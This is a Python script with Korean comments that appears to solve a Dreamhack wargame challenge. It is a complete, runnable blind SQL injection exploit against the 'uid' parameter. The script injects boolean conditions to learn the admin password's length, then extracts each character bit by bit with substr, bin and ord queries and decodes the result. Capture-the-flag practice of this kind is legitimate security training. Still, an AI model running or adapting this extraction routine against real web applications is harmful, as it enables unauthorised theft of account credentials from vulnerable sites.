from requests import get

host = "http://host3.dreamhack.games:9481"  # target url

def init() :
    passwordLength = find_password_length()
    password = find_bitstream_length(passwordLength)
    print(f"admin password is {password}")

# password 길이 찾기
def find_password_length () :
    password_length = 0
    while True:
        password_length += 1    # 길이를 1씩 증가
        query = f"admin' and char_length(upw) = {password_length}-- -"  # 만약 해당 길이 조건이 맞다면 true, 즉 exists 라는 텍스트가 나옴
        r = get(f"{host}/?uid={query}") # get을 통해 호출
        if "exists" in r.text:
            break
    print(f"password length : {password_length}") # 13
    return password_length

# 각 문자의 비트열 길이 찾기 / 각 문자별 비트열 추출

'''
- 각 문자별 비트열 길이 찾기
패드워드의 각 문자가 한글인지 아스키코드인지 알 수 없기 때문에 비트열로 변환하여 추출하기 전에 각 비트열의 길이를 알아야함
비트열은 모두 0과 1로 이루어져있기 때문에 일반적인 length를 사용해도 됨
- 각 문자별 비트열 추출
각 문자별 비트열 추출
'''

def find_bitstream_length (passwordLength) :
    password = ""
    # 문자별 비트열 길이 찾기
    for i in range(1, passwordLength + 1) :
        bit_length = 0
        while True:
            bit_length += 1
            query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}-- -"
            r = get(f"{host}/?uid={query}") # get을 통해 호출
            if "exists" in r.text:
                break            
        print(f"character {i}'s bit length : {bit_length}")
        
        # 각 문자별 비트열 추출
        bits = ""
        for j in range(1, bit_length +1):
            query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1'-- -"
            r = get(f"{host}/?uid={query}") # get을 통해 호출
            if "exists" in r.text :
                bits += "1"
            else :
                bits += "0"                
        print(f"character {i}'s bits : {bits}")
    
        # 비트열을 문자로 변환
        # 비트열을 정수로 변환 -> 정수를 Big Endian 형태의 문자로 변환 -> 변환된 문자를 인코딩에 맞게 변환 순서대로 문자 변환 진행
        # 비트열을 정수로 변환하기 위해 int 클래스 사용
        # 정수를 Big Endian 형태로 변환하기 위해 int.to_bytes 함수를 사용
        # 인코딩에 맞게 변환하기 위해 bytes.decode 사용
        password += int.to_bytes(int(bits,2), (bit_length + 7) // 8, "big").decode("utf-8")

    return password

if __name__ == "__main__" :
    init()